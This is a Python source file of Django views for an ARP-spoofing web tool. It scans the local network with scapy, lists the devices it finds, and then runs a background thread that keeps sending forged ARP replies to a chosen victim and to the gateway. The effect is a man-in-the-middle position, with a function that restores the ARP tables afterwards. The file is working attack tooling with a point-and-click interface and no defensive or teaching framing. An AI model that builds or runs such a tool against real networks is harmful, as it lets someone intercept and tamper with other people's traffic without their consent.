from django.http import JsonResponse, HttpResponseRedirect
from django.shortcuts import render, redirect
from django.contrib import messages
import threading
import time
import scapy.all as scapy
import subprocess
import re

# Global
is_spoofing = False
packet_count = 0

# Utility Functions
def find_gateway(request):
    """
    Captures the router's IP and MAC address dynamically using the `arp -a` command.
    """
    try:
        # Execute the `arp -a` command
        result = subprocess.run(['arp', '-a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode != 0:
            return JsonResponse({"error": "Failed to execute arp command", "details": result.stderr}, status=500)

        # Parse the output to find the gateway's IP and MAC address
        gateway_pattern = r"_gateway \(([\d.]+)\) at ([\da-f:]+)"
        match = re.search(gateway_pattern, result.stdout)

        if not match:
            return JsonResponse({"error": "Gateway not found in ARP table"}, status=404)

        # Extract the IP and MAC address from the match
        ip_address, mac_address = match.groups()
        return JsonResponse({"ip_address": ip_address, "mac_address": mac_address})

    except Exception as e:
        return JsonResponse({"error": str(e)}, status=500)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoofing_thread(victim_ip, router_ip):
    global is_spoofing, packet_count
    try:
        while is_spoofing:
            spoof(victim_ip, router_ip)
            spoof(router_ip, victim_ip)
            packet_count += 2
            print(f"\r[+] Packets sent: {packet_count}", end="", flush=True)
            time.sleep(2)
    except Exception as e:
        print(f"[ERROR] {str(e)}")
    finally:
        is_spoofing = False

# Views
def index(request):
    global is_spoofing
    context = {
        "is_spoofing": is_spoofing,
        "selected_target_ip": request.session.get("selected_target_ip", ""),
        "selected_router_ip": request.session.get("selected_router_ip", ""),
    }
    return render(request, "arp_spoofer/index.html", context)

def start_spoofing(request):
    global is_spoofing, packet_count
    if request.method == "POST":
        victim_ip = request.POST.get("target_ip")  # Target device IP from the dropdown
        router_ip = request.POST.get("router_ip")  # Router IP from a hidden input

        if not victim_ip or not router_ip:
            messages.error(request, "Target IP and Router IP must be selected.")
            return redirect("arp_spoofer:index")

        if is_spoofing:
            messages.error(request, "Spoofing is already running.")
            return redirect("arp_spoofer:index")

        # Save the selected IPs in session
        request.session["selected_target_ip"] = victim_ip
        request.session["selected_router_ip"] = router_ip

        is_spoofing = True
        packet_count = 0  # Reset packet count when spoofing starts
        thread = threading.Thread(target=spoofing_thread, args=(victim_ip, router_ip))
        thread.daemon = True
        thread.start()
        messages.success(request, f"Spoofing started successfully. Target: {victim_ip}, Gateway: {router_ip}")
        return redirect("arp_spoofer:index")


def stop_spoofing(request):
    """
    Stops spoofing and restores ARP tables.
    """
    global is_spoofing
    if request.method == "POST":
        victim_ip = request.POST.get("target_ip")  # Target device IP from the form
        router_ip = request.POST.get("router_ip")  # Router IP from the form

        if not victim_ip or not router_ip:
            messages.error(request, "Target IP and Router IP must be selected.")
            return redirect("arp_spoofer:index")

        if not is_spoofing:
            messages.error(request, "Spoofing is not running.")
            return redirect("arp_spoofer:index")

        is_spoofing = False
        time.sleep(3)  # Allow spoofing thread to exit
        restore(victim_ip, router_ip)
        restore(router_ip, victim_ip)
        print("[+] Spoofing stopped and ARP tables restored.")
        messages.success(request, "Spoofing stopped successfully.")
        return redirect("arp_spoofer:index")


def scan_network(request):
    """
    Scans the network for connected devices using ARP requests and returns a JSON response with the devices.
    """
    if request.method == "POST":
        # Fetch the gateway IP dynamically
        try:
            result = subprocess.run(['arp', '-a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode != 0:
                messages.error(request, "Failed to execute arp command to find gateway.")
                return redirect("arp_spoofer:index")

            gateway_pattern = r"_gateway \(([\d.]+)\) at ([\da-f:]+)"
            match = re.search(gateway_pattern, result.stdout)
            if not match:
                messages.error(request, "Gateway not found in ARP table.")
                return redirect("arp_spoofer:index")

            gateway_ip = match.group(1)  # Extracted gateway IP
        except Exception as e:
            messages.error(request, f"Error finding gateway: {e}")
            return redirect("arp_spoofer:index")

        # Scan the network
        try:
            ip_range = f"{gateway_ip}/24"  # Adjust the CIDR notation as needed
            devices = perform_scan(ip_range)
            return JsonResponse({"devices": devices, "gateway_ip": gateway_ip})
        except Exception as e:
            return JsonResponse({"error": str(e)}, status=500)
    else:
        return JsonResponse({"error": "Invalid request method"}, status=405)


def perform_scan(ip_range):
    """
    Performs the ARP scan on the specified IP range and returns a list of connected devices.
    """
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac_address": element[1].hwsrc}
        clients_list.append(client_dict)

    return clients_list

def get_packet_count(request):
    global packet_count
    return JsonResponse({"packet_count": packet_count})
